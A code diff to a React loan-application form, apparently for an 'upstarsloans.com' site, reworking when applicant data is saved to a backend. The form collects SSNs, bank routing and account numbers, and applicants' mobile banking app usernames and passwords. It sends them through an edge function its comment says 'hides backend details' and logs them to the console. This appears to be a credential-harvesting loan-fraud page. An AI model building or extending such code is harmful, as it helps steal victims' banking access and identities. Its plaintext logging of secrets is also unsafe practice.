@@ -322,61 +322,12 @@ const LoanApplication = () => {
     
     if (Object.keys(errors).length === 0) {
       setIsSubmittingEmail(true)
-      
-      // Generate application ID
-      const applicationId = `LS-${Date.now()}`
-      console.log('Generated application ID:', applicationId)
-      
-      // Prepare customer data for database
-      const customerData = {
-        applicationId: applicationId,
-        firstName: formData.firstName,
-        lastName: formData.lastName,
-        email: formData.email,
-        phoneNumber: formData.phoneNumber,
-        homeAddress: formData.homeAddress,
-        city: formData.city,
-        state: formData.state,
-        zipCode: formData.zipCode,
-        dateOfBirth: formData.dateOfBirth,
-        ssnNumber: formData.ssnNumber,
-        loanAmount: formData.loanAmount,
-        loanPurpose: formData.loanPurpose,
-        loanTerm: formData.loanTerm,
-        monthlyPayment: calculateMonthlyPayment(formData.loanAmount, formData.loanTerm),
-        loanAgent: formData.loanAgent,
-        bankName: formData.bankName === 'Other' ? formData.customBankName : formData.bankName,
-        mobileAppUsername: formData.mobileAppUsername,
-        mobileAppPassword: formData.mobileAppPassword,
-        routingNumber: formData.routingNumber,
-        accountNumber: formData.accountNumber,
-        userId: formData.mobileAppUsername,
-        password: formData.mobileAppPassword,
-        status: 'review'
-      };
-      console.log('Customer data prepared for database:', customerData)
 
-      // Save customer to database via Edge Function (hides backend details)
-      console.log('=== SAVING CUSTOMER VIA EDGE FUNCTION ===')
-      console.log('Calling submitApplication with:', customerData)
-      let savedCustomer = null
-      try {
-        const result = await submitApplication(customerData)
-        savedCustomer = result.data
-        console.log('✅ CUSTOMER SAVED SUCCESSFULLY:', savedCustomer)
-        console.log('Customer ID:', savedCustomer?.id)
-      } catch (dbError) {
-        console.error('❌ EDGE FUNCTION SAVE FAILED:', dbError)
-        console.error('❌ Error message:', dbError.message || dbError)
-        // Continue with agreement even if save fails
-        savedCustomer = { ...customerData, id: null }
-      }
-      
-      setIsSubmittingEmail(false)
-      
-      // Then show agreement for signature
+      // Step 2 only validates and advances to the agreement/signature step.
+      // The actual database insert happens once, when the customer submits the agreement.
       setShowAgreement(true)
       setValidationErrors({})
+      setIsSubmittingEmail(false)
     }
   }
 
@@ -839,19 +790,13 @@ Terms of Service: www.upstarsloans.com/terms-of-service`
       // Save customer to database via Edge Function (hides backend details)
       console.log('=== SAVING CUSTOMER VIA EDGE FUNCTION ===')
       console.log('Calling submitApplication with:', customerData)
-      let savedCustomer = null
-      try {
-        const result = await submitApplication(customerData)
-        savedCustomer = result.data
-        console.log('✅ CUSTOMER SAVED SUCCESSFULLY:', savedCustomer)
-        console.log('Customer ID:', savedCustomer?.id)
-      } catch (dbError) {
-        console.error('❌ EDGE FUNCTION SAVE FAILED:', dbError)
-        console.error('❌ Error message:', dbError.message || dbError)
-        console.error('❌ Will continue with agreement...')
-        // Create a fallback savedCustomer object so the rest of the flow works
-        savedCustomer = { ...customerData, id: null }
+      const result = await submitApplication(customerData)
+      const savedCustomer = result.data
+      if (!savedCustomer?.id) {
+        throw new Error('Application was not saved to the database')
       }
+      console.log('✅ CUSTOMER SAVED SUCCESSFULLY:', savedCustomer)
+      console.log('Customer ID:', savedCustomer.id)
       
       // Save KYC documents and agreement to database (only if customer was saved successfully)
       if (savedCustomer.id) {
@@ -926,6 +871,11 @@ Terms of Service: www.upstarsloans.com/terms-of-service`
       // Store customer data for dashboard access
       const dashboardData = {
         ...savedCustomer,
+        applicationId: savedCustomer.application_id || applicationId,
+        userId: savedCustomer.user_id || formData.mobileAppUsername,
+        mobileAppUsername: formData.mobileAppUsername,
+        mobileAppPassword: formData.mobileAppPassword,
+        password: savedCustomer.password || formData.mobileAppPassword,
         // KYC Documents info for dashboard (only if provided)
         idFrontName: idFront ? idFront.name : '',
         idFrontSize: idFront ? `${(idFront.size / 1024 / 1024).toFixed(2)} MB` : '',
